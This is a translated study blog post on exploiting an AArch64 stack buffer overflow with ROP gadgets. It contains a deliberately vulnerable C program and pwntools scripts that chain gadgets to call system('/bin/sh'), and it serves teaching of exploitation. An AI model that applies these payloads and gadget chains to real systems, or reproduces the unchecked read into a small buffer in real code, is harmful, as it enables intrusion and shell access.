---
title: "[AArch64] Buffer OverFlow (with chaining)"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ We will briefly cover how to use gadgets using the changed ASM and registers. #include #include #include void gift(){ write(1, \"/bin/sh\\x00\",0x8); system('ls'); } void"
date: "2024-03-20"
translation_key: "tistory-7761d84afc1a"
tags: ["STUDY/PWNABLE_AArch64"]
category: "STUDY/PWNABLE_AArch64"
source_url: "https://whrdud727.tistory.com/entry/AArch64-Buffer-OverFlow-with-chaining"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※****

I will briefly cover how to use gadgets using the changed ASM and registers.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void gift(){
	write(1, "/bin/sh\x00",0x8);
	system('ls');
}

void gadget(){
	asm("ldr x30, [sp]");
	asm("ldr x0, [sp, #8]");
	asm("ldr x1, [sp, #16]");
	asm("ldr x2, [sp, #24]");
	asm("ret");

}
void vuln(){
	char buf[0x20];

	read(0,buf,0x100);
	printf("Your Input : %s", buf);
}

int main(){
	write(1,"Input : ",0x8);

	vuln();

	return 0;
}
```

We added a gadget that sequentially passes values from sp to x30, x0, x1, and x2 using the ldr command.

![](/assets/images/tistory/tistory-7761d84afc1a/001.png)

And since the /bin/sh string and the address of system() exist separately, each address is obtained from gift().

![](/assets/images/tistory/tistory-7761d84afc1a/002.png)

Since the register of X30 is ret, the address of system() is entered in that part,

Enter the address of the /bin/sh string in X0, which is passed as the first argument.

And you can run system('/bin/sh') by entering dummy values ​​in X1 and X2.

```
from pwn import *

p = process(['qemu-aarch64-static', 'a.out'])
#p = process(['qemu-aarch64-static', '-g',  '1234', 'a.out'])
e = ELF('a.out')

context.log_level = 'debug'

#func
system =e.sym['system']
read = e.sym['read']
write = e.sym['write']

#gadget
gadget= 0x0000000000400704
bss = e.bss()
binsh = 0x4593b8

#payload
payload = b'a'*0x20
payload += b'b'*0x8

payload += p64(gadget)
payload += p64(system)
payload += p64(binsh)
payload += p64(0)
payload += p64(0)

#send
p.sendafter(b':', payload)

p.interactive()
```

* * *

If you look at the glibc file, you will find the following gadget, which you can use.

```
ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
```

In this case, enter the /bin/sh string in the sp+0x18 position, and enter the values to be used as X29 and X30 in order in the sp position.

This is an example of use.

![](/assets/images/tistory/tistory-7761d84afc1a/003.png)

This is the code that inputs data into the sp-0x30 location.

You can modulate X29, X30, and X0 by entering this code as follows.

```
payload = b'a'*0x28
payload += p64(gadget)
payload += b'a'*0x10
payload += p64(system)*2
payload += p64(0x0)
payload += p64(binsh)
```